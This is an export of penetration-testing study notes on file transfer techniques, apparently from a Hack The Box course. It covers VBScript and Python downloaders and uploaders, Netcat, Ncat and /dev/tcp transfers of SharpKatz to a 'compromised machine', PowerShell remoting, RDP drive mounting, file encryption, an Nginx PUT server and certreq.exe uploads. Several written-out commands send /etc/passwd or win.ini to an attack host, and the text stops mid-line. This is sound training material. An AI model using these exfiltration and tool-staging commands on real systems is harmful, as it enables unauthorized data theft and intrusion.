Code\n\n```cmd-session\nC:\\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n```\n\n---\n\n## VBScript\n\n[VBScript](https://en.wikipedia.org/wiki/VBScript) (\"Microsoft Visual Basic Scripting Edition\") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.\n\nThe following VBScript example can be used based on [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). We'll create a file called `wget.vbs` and save the following content:\n\nCode: vbscript\n\n```vbscript\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n```\n\nWe can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.\n\n#### Download a File Using VBScript and cscript.exe\n\nTransferring Files with Code\n\n```cmd-session\nC:\\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n```\n\n---\n\n## Upload Operations using Python3\n\nIf we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).\n\n#### Starting the Python uploadserver Module\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 -m uploadserver \n\nFile upload available at /upload\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\n#### Uploading a File Using a Python One-liner\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'\n```\n\nLet's divide this one-liner into multiple lines to understand each piece better.\n\nCode: python\n\n```python\n# To use the requests function, we need to import the module first.\nimport requests \n\n# Define the target URL where we will upload the file.\nURL = \"http://192.168.49.128:8000/upload\"\n\n# Define the file we want to read, open it and save it in a variable.\nfile = open(\"/etc/passwd\",\"rb\")\n\n# Use a requests POST request to upload the file. \nr = requests.post(url,files={\"files\":file})\n```\n\nWe can do the same with any other programming language. A good practice is picking one and trying to build an upload program.\n\n---\n\n## Section Recap\n\nUnderstanding how we can use code to download and upload files may help us achieve our goals during a red teaming exercise, a penetration test, a CTF competition, an incident response exercise, a forensic investigation, or even in our day-to-day sysadmin work.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/06-Miscellaneous File Transfer Methods",
    "path": "02_CPTS/06-File Transfers/06-Miscellaneous File Transfer Methods.md",
    "title": "06 Miscellaneous File Transfer Methods",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- We've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more method...",
    "category": "02_CPTS",
    "content": "\n---\n\nWe've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.\n\nThis section will cover alternative methods such as transferring files using [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) and using RDP and PowerShell sessions.\n\n---\n\n## Netcat\n\n[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.\n\nThe original Netcat was [released](http://seclists.org/bugtraq/1995/Oct/0028.html) by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.\n\nIn this section, we will use both the original Netcat and Ncat.\n\n**Note:** **Ncat** is used in HackTheBox's PwnBox as nc, ncat, and netcat.\n\n## File Transfer with Netcat and Ncat\n\nThe target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.\n\nIn this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.\n\nWe'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\\(stdin\\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.\n\n#### NetCat - Compromised Machine - Listening on Port 8000\n\nMiscellaneous File Transfer Methods\n\n```shell-session\nvictim@target:~$ # Example using Original Netcat\nvictim@target:~$ nc -l -p 8000 > SharpKatz.exe\n```\n\nIf the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.\n\n#### Ncat - Compromised Machine - Listening on Port 8000\n\nMiscellaneous File Transfer Methods\n\n```shell-session\nvictim@target:~$ # Example using Ncat\nvictim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe\n```\n\nFrom our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.\n\n#### Netcat - Attack Host - Sending File to Compromised machine\n\nMiscellaneous File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe\ndrxh3kr@htb[/htb]$ # Example using Original Netcat\ndrxh3kr@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe\n```\n\nBy utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.\n\n#### Ncat - Attack Host - Sending File to Compromised machine\n\nMiscellaneous File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe\ndrxh3kr@htb[/htb]$ # Example using Ncat\ndrxh3kr@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe\n```\n\nInstead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.\n\n#### Attack Host - Sending File as Input to Netcat\n\nMiscellaneous File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ # Example using Original Netcat\ndrxh3kr@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe\n```\n\n#### Compromised Machine Connect to Netcat to Receive the File\n\nMiscellaneous File Transfer Methods\n\n```shell-session\nvictim@target:~$ # Example using Original Netcat\nvictim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe\n```\n\nLet's do the same with Ncat:\n\n#### Attack Host - Sending File as Input to Ncat\n\nMiscellaneous File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ # Example using Ncat\ndrxh3kr@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe\n```\n\n#### Compromised Machine Connect to Ncat to Receive the File\n\nMiscellaneous File Transfer Methods\n\n```shell-session\nvictim@target:~$ # Example using Ncat\nvictim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe\n```\n\nIf we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).\n\nWriting to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.\n\n#### NetCat - Sending File as Input to Netcat\n\nMiscellaneous File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ # Example using Original Netcat\ndrxh3kr@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe\n```\n\n#### Ncat - Sending File as Input to Ncat\n\nMiscellaneous File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ # Example using Ncat\ndrxh3kr@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe\n```\n\n#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File\n\nMiscellaneous File Transfer Methods\n\n```shell-session\nvictim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe\n```\n\n**Note:** The same operation can be used to transfer files from the compromised host to our Pwnbox.\n\n---\n\n## PowerShell Session File Transfer\n\nWe already talked about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.\n\n[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.\n\nTo create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.\n\nWe have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.\n\n#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.\n\nMiscellaneous File Transfer Methods\n\n```powershell-session\nPS C:\\htb> whoami\n\nhtb\\administrator\n\nPS C:\\htb> hostname\n\nDC01\n```\n\nMiscellaneous File Transfer Methods\n\n```powershell-session\nPS C:\\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985\n\nComputerName     : DATABASE01\nRemoteAddress    : 192.168.1.101\nRemotePort       : 5985\nInterfaceAlias   : Ethernet0\nSourceAddress    : 192.168.1.100\nTcpTestSucceeded : True\n```\n\nBecause this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.\n\n#### Create a PowerShell Remoting Session to DATABASE01\n\nMiscellaneous File Transfer Methods\n\n```powershell-session\nPS C:\\htb> $Session = New-PSSession -ComputerName DATABASE01\n```\n\nWe can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.\n\n#### Copy samplefile.txt from our Localhost to the DATABASE01 Session\n\nMiscellaneous File Transfer Methods\n\n```powershell-session\nPS C:\\htb> Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n```\n\n#### Copy DATABASE.txt from DATABASE01 Session to our Localhost\n\nMiscellaneous File Transfer Methods\n\n```powershell-session\nPS C:\\htb> Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session\n```\n\n---\n\n## RDP\n\nRDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.\n\nIf we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.\n\nAs an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.\n\n#### Mounting a Linux Folder Using rdesktop\n\nMiscellaneous File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'\n```\n\n#### Mounting a Linux Folder Using xfreerdp\n\nMiscellaneous File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer\n```\n\nTo access the directory, we can connect to `\\\\tsclient\\`, allowing us to transfer files to and from the RDP session.\n\n![Windows File Explorer showing a network folder named 'tsclient' with a subfolder 'linux'.](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)\n\nAlternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.\n\n![Remote Desktop Connection settings showing options for configuring remote audio, keyboard shortcuts, and local resources like printers and drives.](https://academy.hackthebox.com/storage/modules/24/rdp.png)\n\nAfter selecting the drive, we can interact with it in the remote session that follows.\n\n**Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.\n\n---\n\n## Practice Makes Perfect\n\nIt's worth referencing this section or creating your own notes on these techniques and applying them to labs in other modules in the Penetration Tester Job Role Path and beyond. Some modules/sections where these could come in handy include:\n\n- `Active Directory Enumeration and Attacks` - Skills Assessments 1 & 2\n- Throughout the `Pivoting, Tunnelling & Port Forwarding` module\n- Throughout the `Attacking Enterprise Networks` module\n- Throughout the `Shells & Payloads` module\n\nYou never know what you're up against until you start a lab (or real-world assessment). Once you master one technique in this section or other sections of this module, try another. By the time you finish the Penetration Tester Job Role Path, it would be great to have tried most, if not all, of these techniques. This will help with your \"muscle memory\" and give you ideas of how to upload/download files when you face a different environment with certain restrictions that make one easier method fail. In the next section, we'll discuss protecting our file transfers when dealing with sensitive data.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/07-Protected File Transfers",
    "path": "02_CPTS/06-File Transfers/07-Protected File Transfers.md",
    "title": "07 Protected File Transfers",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that...",
    "category": "02_CPTS",
    "content": "\n---\n\nAs penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization's network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. However, sometimes these options are not available to us, and a different approach is required.\n\nNote: Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect.\n\nTherefore, encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.\n\nData leakage during a penetration test could have severe consequences for the penetration tester, their company, and the client. As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.\n\n---\n\n## File Encryption on Windows\n\nMany different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.\n\n#### Invoke-AESEncryption.ps1\n\nProtected File Transfers\n\n```powershell-session\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\" \n\nDescription\n-----------\nEncrypts the string \"Secret Test\" and outputs a Base64 encoded ciphertext.\n \n.EXAMPLE\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\"\n \nDescription\n-----------\nDecrypts the Base64 encoded string \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\" and outputs plain text.\n \n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin\n \nDescription\n-----------\nEncrypts the file \"file.bin\" and outputs an encrypted file \"file.bin.aes\"\n \n.EXAMPLE\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Path file.bin.aes\n \nDescription\n-----------\nDecrypts the file \"file.bin.aes\" and outputs an encrypted file \"file.bin\"\n#>\nfunction Invoke-AESEncryption {\n    [CmdletBinding()]\n    [OutputType([string])]\n    Param\n    (\n        [Parameter(Mandatory = $true)]\n        [ValidateSet('Encrypt', 'Decrypt')]\n        [String]$Mode,\n\n        [Parameter(Mandatory = $true)]\n        [String]$Key,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptText\")]\n        [String]$Text,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptFile\")]\n        [String]$Path\n    )\n\n    Begin {\n        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed\n        $aesManaged = New-Object System.Security.Cryptography.AesManaged\n        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC\n        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n        $aesManaged.BlockSize = 128\n        $aesManaged.KeySize = 256\n    }\n\n    Process {\n        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\n\n        switch ($Mode) {\n            'Encrypt' {\n                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\n                \n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName + \".aes\"\n                }\n\n                $encryptor = $aesManaged.CreateEncryptor()\n                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\n                $encryptedBytes = $aesManaged.IV + $encryptedBytes\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\n                \n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File encrypted to $outPath\"\n                }\n            }\n\n            'Decrypt' {\n                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}\n                \n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName -replace \".aes\"\n                }\n\n                $aesManaged.IV = $cipherBytes[0..15]\n                $decryptor = $aesManaged.CreateDecryptor()\n                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}\n                \n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File decrypted to $outPath\"\n                }\n            }\n        }\n    }\n\n    End {\n        $shaManaged.Dispose()\n        $aesManaged.Dispose()\n    }\n}\n```\n\nWe can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.\n\n#### Import Module Invoke-AESEncryption.ps1\n\nProtected File Transfers\n\n```powershell-session\nPS C:\\htb> Import-Module .\\Invoke-AESEncryption.ps1\n```\n\nAfter the script is imported, it can encrypt strings or files, as shown in the following examples. This command creates an encrypted file with the same name as the encrypted file but with the extension \"`.aes`.\"\n\n#### File Encryption Example\n\nProtected File Transfers\n\n```powershell-session\nPS C:\\htb> Invoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\n\nFile encrypted to C:\\htb\\scan-results.txt.aes\nPS C:\\htb> ls\n\n    Directory: C:\\htb\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1\n-a----        11/18/2020  12:19 PM           1724 scan-results.txt\n-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes\n```\n\nUsing very `strong` and `unique` passwords for encryption for every company where a penetration test is performed is essential. This is to prevent sensitive files and information from being decrypted using one single password that may have been leaked and cracked by a third party.\n\n---\n\n## File Encryption on Linux\n\n[OpenSSL](https://www.openssl.org/) is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files \"nc style\" to encrypt files.\n\nTo encrypt a file using `openssl` we can select different ciphers, see [OpenSSL man page](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html). Let's use `-aes256` as an example. We can also override the default iterations counts with the option `-iter 100000` and add the option `-pbkdf2` to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.\n\n#### Encrypting /etc/passwd with openssl\n\nProtected File Transfers\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\n\nenter aes-256-cbc encryption password:                                                         \nVerifying - enter aes-256-cbc encryption password:                              \n```\n\nRemember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file. To decrypt the file, we can use the following command:\n\n#### Decrypt passwd.enc with openssl\n\nProtected File Transfers\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    \n\nenter aes-256-cbc decryption password:\n```\n\nWe can use any of the previous methods to transfer this file, but it's recommended to use a secure transport method such as HTTPS, SFTP, or SSH. As always, practice the examples in this section against target hosts in this or other modules and reproduce what you can (such as the `openssl` examples using the Pwnbox. The following section will cover different ways to transfer files over HTTP and HTTPS.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/08-Catching Files over HTTP S",
    "path": "02_CPTS/06-File Transfers/08-Catching Files over HTTP S.md",
    "title": "08 Catching Files Over HTTP S",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- HTTP/S Web transfer is the most common way most people transfer files because HTTP/HTTPS are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, th...",
    "category": "02_CPTS",
    "content": "\n---\n\n## HTTP/S\n\nWeb transfer is the most common way most people transfer files because `HTTP`/`HTTPS` are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, the file will be encrypted in transit. There is nothing worse than being on a penetration test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.\n\nWe have already discussed using the Python3 [uploadserver module](https://github.com/Densaugeo/uploadserver) to set up a web server with upload capabilities, but we can also use Apache or Nginx. This section will cover creating a secure web server for file upload operations.\n\n---\n\n## Nginx - Enabling PUT\n\nA good alternative for transferring files to `Apache` is [Nginx](https://www.nginx.com/resources/wiki/) because the configuration is less complicated, and the module system does not lead to security issues as `Apache` can.\n\nWhen allowing `HTTP` uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. `Apache` makes it easy to shoot ourselves in the foot with this, as the `PHP` module loves to execute anything ending in `PHP`. Configuring `Nginx` to use PHP is nowhere near as simple.\n\n#### Create a Directory to Handle Uploaded Files\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory\n```\n\n#### Change the Owner to www-data\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory\n```\n\n#### Create Nginx Configuration File\n\nCreate the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:\n\nCatching Files over HTTP/S\n\n```shell-session\nserver {\n    listen 9001;\n    \n    location /SecretUploadDirectory/ {\n        root    /var/www/uploads;\n        dav_methods PUT;\n    }\n}\n```\n\n#### Symlink our Site to the sites-enabled Directory\n\nCatching Files over HTTP/S\n\n```shell-session\n\ndrxh3kr@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/\n```\n\n#### Start Nginx\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo systemctl restart nginx.service\n```\n\nIf we get any error messages, check `/var/log/nginx/error.log`. If using Pwnbox, we will see port 80 is already in use.\n\n#### Verifying Errors\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ tail -2 /var/log/nginx/error.log\n\n2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)\n2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()\n```\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ ss -lnpt | grep 80\n\nLISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:((\"python\",pid=`2811`,fd=3),(\"python\",pid=2070,fd=3),(\"python\",pid=1968,fd=3),(\"python\",pid=1856,fd=3))\n```\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ ps -ef | grep 2811\n\nuser65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`\nroot        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811\n```\n\nWe see there is already a module listening on port 80. To get around this, we can remove the default Nginx configuration, which binds on port 80.\n\n#### Remove NginxDefault Configuration\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default\n```\n\nNow we can test uploading by using `cURL` to send a `PUT` request. In the below example, we will upload the `/etc/passwd` file to the server and call it users.txt\n\n#### Upload File Using cURL\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt\n```\n\nCatching Files over HTTP/S\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt \n\nuser65:x:1000:1000:,,,:/home/user65:/bin/bash\n```\n\nOnce we have this working, a good test is to ensure the directory listing is not enabled by navigating to `http://localhost/SecretUploadDirectory`. By default, with `Apache`, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to `Nginx` being minimal, features like that are not enabled by default.\n\n---\n\n## Using Built-in Tools\n\nIn the next section, we'll introduce the topic of \"Living off the Land\" or using built-in Windows and Linux utilities to perform file transfer activities. We will repeatedly come back to this concept throughout the modules in the Penetration Tester path when covering tasks such as Windows and Linux privilege escalation and Active Directory enumeration and exploitation.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/09-Living off The Land",
    "path": "02_CPTS/06-File Transfers/09-Living off The Land.md",
    "title": "09 Living Off The Land",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- The phrase \"Living off the land\" was coined by Christopher Campbell @obscuresec & Matt Graeber @mattifestation at DerbyCon 3. The term LOLBins (Living off the Land binaries) came from a Twitter di...",
    "category": "02_CPTS",
    "content": "\n---\n\nThe phrase \"Living off the land\" was coined by Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) & Matt Graeber [@mattifestation](https://twitter.com/mattifestation) at [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).\n\nThe term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:\n\n- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)\n- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)\n\nLiving off the Land binaries can be used to perform functions such as:\n\n- Download\n- Upload\n- Command Execution\n- File Read\n- File Write\n- Bypasses\n\nThis section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows & Linux systems.\n\n---\n\n## Using the LOLBAS and GTFOBins Project\n\n[LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins for Linux](https://gtfobins.github.io/) are websites where we can search for binaries we can use for different functions.\n\n### LOLBAS\n\nTo search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.\n\n![LOLBAS project page listing binaries like CertReq.exe with functions and ATT&CK techniques.](https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg)\n\nLet's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.\n\nWe need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.\n\n#### Upload win.ini to our Pwnbox\n\nLiving off The Land\n\n```cmd-session\nC:\\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\\windows\\win.ini\nCertificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)\n```\n\nThis will send the file to our Netcat session, and we can copy-paste its contents.\n\n#### File Received in our Netcat Session\n\nLiving off The Land\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nc -lvnp 8000\n\nlistening on [any] 8000 ...\nconnect to [192.168.49.128] from 